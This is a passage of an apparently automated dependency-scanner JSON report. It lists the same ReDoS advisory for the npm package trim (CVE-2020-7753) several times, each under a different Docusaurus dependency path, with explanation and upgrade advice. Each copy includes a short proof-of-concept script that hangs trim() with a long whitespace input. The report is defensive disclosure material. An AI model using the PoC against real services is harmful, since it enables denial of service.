'/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/plugin-google-analytics@2.4.3",
        "@docusaurus/core@2.4.3",
        "@docusaurus/mdx-loader@2.4.3",
        "@mdx-js/mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        "remark-parse@9.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
